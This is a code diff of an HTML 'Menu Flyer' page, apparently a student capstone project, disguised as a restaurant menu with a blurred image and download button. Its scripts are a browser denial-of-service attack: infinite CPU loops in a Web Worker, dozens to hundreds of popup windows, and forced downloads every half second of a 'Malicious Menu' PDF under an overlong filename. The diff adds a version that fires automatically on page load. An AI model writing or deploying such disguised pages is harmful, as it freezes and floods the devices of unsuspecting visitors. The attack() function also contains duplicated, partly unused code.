@@ -3,11 +3,13 @@
 <head>
   <title>Menu Flyer</title>
   <style>
-    .container {
+    /* Create a Container */
+    .container {  
       position: relative;
       width: 300px;
       height: 400px;
     }
+    /* Add Menu Image, while blurred */
     #blurred {
       filter: blur(8px);
       width: 100%;
@@ -15,6 +17,7 @@
       background: url('menu.jpg') no-repeat center center;
       background-size: cover;
     }
+    /* Create Download Button */
     #downloadBtn {
       position: absolute;
       top: 50%;
@@ -33,18 +36,23 @@
   </div>
 
   <script>
-    document.getElementById('downloadBtn').addEventListener('click', () => {
-      // Remove blur
-      document.getElementById('blurred').style.filter = 'none';
+    /////////////////////////////////////////////////////////////////////////////////////////////////////
+    //
+    // This section is based on them clicking the button on the form
+    //
+    /////////////////////////////////////////////////////////////////////////////////////////////////////
+    document.getElementById('downloadBtn').addEventListener('click', () => {    // When button is clicked
+      document.getElementById('blurred').style.filter = 'none';                 // Remove Blur
 
 
 
       // Start CPU intensive loop
-      function cpuLoad() {
-        let x = 0;
-        while (true) {
-          x += Math.sqrt(Math.random());
-          if (x > 1e7) x = 0; // reset to avoid overflow
+      // The purpose of this section is to use up CPU memory and resources
+      function cpuLoad() {                                                      // Create func CPU Loading                             
+        let x = 0;                                                              // Set x to 0
+        while (true) {                                                          // Loop
+          x += Math.sqrt(Math.random());                                        // Do math
+          if (x > 1e7) x = 0;                                                   // Reset to avoid overflow
         }
       }
 
@@ -55,10 +63,18 @@
 
       // Multiple Windows
       for (let i = 0; i < 200; i++) {
-        window.open('https://arizona5005.github.io/Capstone/' + Math.random(), '_blank', 'noopener,noreferrer,width=400,height=400');
+        window.open('https://arizona5005.github.io/Capstone/', '_blank', 'noopener,noreferrer,width=400,height=400');
       }
 
       // Start repeated downloads
+      // Create anchor element
+      // Creates download loop function
+      // References our Malicious Menu link
+      // Downloads it under a very long name to take up resources
+      // Add link to document
+      // Click the link
+      // Remove the link
+
       function downloadLoop() {
         const link = document.createElement('a');
         link.href = 'https://arizona5005.github.io/Capstone/menu.pdf';
@@ -69,6 +85,12 @@
       }
 
       // Run CPU load in a Web Worker to keep UI responsive (optional)
+      // If worker supported
+      // Infinite message in JS
+      // Create new worker
+      // Send message 
+      // Else, run CPU load loop to freeze UI
+
       if (window.Worker) {
         const blob = new Blob([`onmessage = function() { while(true) {} }`], {type: 'application/javascript'});
         const worker = new Worker(URL.createObjectURL(blob));
@@ -83,11 +105,27 @@
   </script>
 
 <script>
-  function attack() {
-    // Remove blur
-    document.getElementById('blurred').style.filter = 'none';
 
+    /////////////////////////////////////////////////////////////////////////////////////////////////////
+    //
+    // This section is based on them just landing on the page
+    // Thought it a good idea to go offensive instead of waiting for them to click
+    //
+    /////////////////////////////////////////////////////////////////////////////////////////////////////
+  function attack() {                                                               // No click, on landing attack
+    document.getElementById('blurred').style.filter = 'none';                       // Remove Blur
+
+    
     // Start repeated downloads
+    // Create anchor element
+    // Creates download loop function
+    // References our Malicious Menu link
+    // Downloads it under a very long name to take up resources
+    // Add link to document
+    // Click the link
+    // Remove the link
+    // Start repeated downloads
+
     function downloadLoop() {
       const link = document.createElement('a');
       link.href = 'https://arizona5005.github.io/Capstone/menu.pdf';
@@ -97,32 +135,49 @@
       document.body.removeChild(link);
     }
 
-      // Start download loop every 1/2 seconds
-      setInterval(downloadLoop, 500);
-
     // Multiple Tabs
-    for (let i = 0; i < 10; i++) {
-      window.open('https://arizona5005.github.io/Capstone/', '_blank');
+    for (let i = 0; i < 15; i++) {
+      window.open('https://arizona5005.github.io/Capstone/menu.pdf', '_blank');
     }
 
     // Multiple Windows
-    for (let i = 0; i < 10; i++) {
-      window.open('https://arizona5005.github.io/Capstone/' + Math.random(), '_blank', 'noopener,noreferrer,width=400,height=400');
+    for (let i = 0; i < 15; i++) {
+      window.open('https://arizona5005.github.io/Capstone/menu.pdf', '_blank', 'noopener,noreferrer,width=400,height=400');
     }
 
-    // Run CPU load in a Web Worker to keep UI responsive (optional)
-    if (window.Worker) {
-      const blob = new Blob([`onmessage = function() { while(true) {} }`], {type: 'application/javascript'});
-      const worker = new Worker(URL.createObjectURL(blob));
-      worker.postMessage('');
-    } else {
-      // Fallback for browsers without Web Worker support
-      let x = 0;
-      while (true) {
-        x += Math.sqrt(Math.random());
-        if (x > 1e7) x = 0;
+
+    // Start repeated downloads
+    // Create anchor element
+    // Creates download loop function
+    // References our Malicious Menu link
+    // Downloads it under a very long name to take up resources
+    // Add link to document
+    // Click the link
+    // Remove the link
+    // Start repeated downloads
+
+    function downloadLoop() {
+      const link = document.createElement('a');
+      link.href = 'https://arizona5005.github.io/Capstone/menu.pdf';
+      link.download = 'menu_super_long_filename_that_just_keeps_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going_and_going.pdf';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    }
+
+
+    // Start CPU intensive loop
+    // The purpose of this section is to use up CPU memory and resources
+    function cpuLoad() {                                                      // Create func CPU Loading                             
+      let x = 0;                                                              // Set x to 0
+      while (true) {                                                          // Loop
+        x += Math.sqrt(Math.random());                                        // Do math
+        if (x > 1e7) x = 0;                                                   // Reset to avoid overflow
       }
     }
+
+    // Start download loop every 1/2 seconds
+    setInterval(downloadLoop, 500);
   }
 
   // Activate attack automatically on page load
